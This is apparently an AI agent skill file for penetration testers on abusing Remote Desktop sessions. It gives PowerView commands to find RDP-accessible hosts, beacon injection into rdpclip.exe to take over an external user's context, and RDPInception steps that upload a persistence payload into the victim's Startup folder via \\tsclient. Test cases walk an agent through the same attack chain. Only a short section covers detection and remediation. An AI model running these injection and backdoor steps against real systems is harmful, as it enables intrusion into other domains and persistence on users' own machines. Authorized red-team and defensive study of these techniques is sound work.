---
name: rdp-session-abuse
description: How to abuse RDP sessions for lateral movement and pivoting in authorized penetration testing. Use this skill whenever the user mentions RDP sessions, remote desktop pivoting, session injection, RDPInception, or needs to test RDP security in an Active Directory environment. This skill covers finding RDP-accessible machines, injecting into RDP processes, accessing mounted drives via tsclient, and pivoting to external domains through RDP sessions.
---

# RDP Session Abuse Techniques

This skill provides methodologies for testing RDP security and exploiting RDP session vulnerabilities in **authorized penetration testing engagements only**.

## ⚠️ Authorization Required

**Before using these techniques:**
- Confirm you have written authorization for the target environment
- Ensure RDP testing is within your engagement scope
- Document all activities for reporting
- These techniques should only be used in controlled security assessments

## When to Use This Skill

Use this skill when:
- Testing RDP security in Active Directory environments
- Looking for lateral movement paths through RDP
- Assessing RDP session isolation and drive mounting risks
- Evaluating external user RDP access controls
- Performing authorized red team exercises

## Core Techniques

### 1. Finding RDP-Accessible Machines

Identify which computers grant RDP access to specific user groups:

```powershell
# Find computers where a group has Remote Desktop Users access
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

# Alternative method
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```

**Why this matters:** External groups with RDP access create pivot opportunities. If you compromise one machine in the group's access list, you can wait for external users to connect.

### 2. Monitoring Active RDP Sessions

Check who is currently logged in via RDP:

```bash
net logons
```

**Output example:**
```
Logged on users at \\localhost:
EXT\super.admin
```

**Why this matters:** This reveals external domain users who have connected, showing you which sessions you can potentially pivot to.

### 3. RDP Process Injection

Inject into the RDP session process to pivot to the user's context:

```bash
# List processes to find RDP-related ones
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

# Inject beacon into the RDP process
beacon> inject 4960 x64 tcp-local
```

**Target processes:**
- `rdpclip.exe` - Clipboard process (most common target)
- `mstsc.exe` - Remote Desktop client
- `rdpinit.exe` - RDP initialization

**Why this matters:** Once injected, you operate in the external user's security context, allowing you to:
- Access their domain resources
- Use their permissions for lateral movement
- Pivot to the external domain

### 4. RDPInception - Accessing Mounted Drives

When users RDP with drive redirection enabled, their local drives are accessible via `\\tsclient\`:

```bash
# List available mounted drives
beacon> ls \\tsclient\c

# Navigate to victim's startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# Upload persistence mechanism
beacon> upload C:\Payloads\pivot.exe
```

**Available paths:**
- `\\tsclient\c` - C: drive from victim's machine
- `\\tsclient\d` - D: drive from victim's machine
- `\\tsclient\home` - Home directory (if mounted)

**Why this matters:** This allows you to:
- Read sensitive files from the victim's original machine
- Plant backdoors for persistence on the victim's machine
- Access credentials and data without direct access to their machine

## Detection Evasion Considerations

### Process Injection Detection
- Monitor for unusual parent-child process relationships
- Watch for `rdpclip.exe` with unexpected network connections
- Check for multiple instances of RDP processes

### Drive Access Detection
- Monitor `\\tsclient\` access in file audit logs
- Watch for file creation in startup folders
- Check for unusual network share access patterns

## Reporting

When documenting findings:

1. **Risk Level:** High - RDP session abuse enables:
   - Lateral movement to external domains
   - Persistence on user machines
   - Credential theft opportunities

2. **Remediation:**
   - Restrict RDP access to minimum necessary users
   - Disable drive redirection in RDP policies
   - Implement network segmentation for RDP
   - Monitor RDP session creation and process injection
   - Use RDP gateway with MFA

## Related Techniques

- Session stealing via other tools (see network-services-pentesting/pentesting-rdp.md)
- Active Directory lateral movement
- Credential harvesting from RDP sessions
- Pass-the-hash through RDP pivots

## Test Cases

### Test Case 1: Find RDP Access Points
**Scenario:** You have compromised a domain controller and need to find machines accessible by external users.

**Expected actions:**
1. Run `Get-DomainGPOUserLocalGroupMapping` to find RDP-accessible machines
2. Document the list of target machines
3. Recommend compromising one machine to wait for external user connections

### Test Case 2: RDP Session Injection
**Scenario:** An external user has connected via RDP to a compromised machine.

**Expected actions:**
1. Use `net logons` to identify the external user
2. Find the RDP process with `ps`
3. Inject into the process to pivot to external domain context
4. Document the pivot path and permissions gained

### Test Case 3: RDPInception Drive Access
**Scenario:** You've injected into an RDP session and want to access the victim's original machine.

**Expected actions:**
1. Check `\\tsclient\` for mounted drives
2. Navigate to startup folder
3. Upload persistence mechanism
4. Document the persistence path and access gained
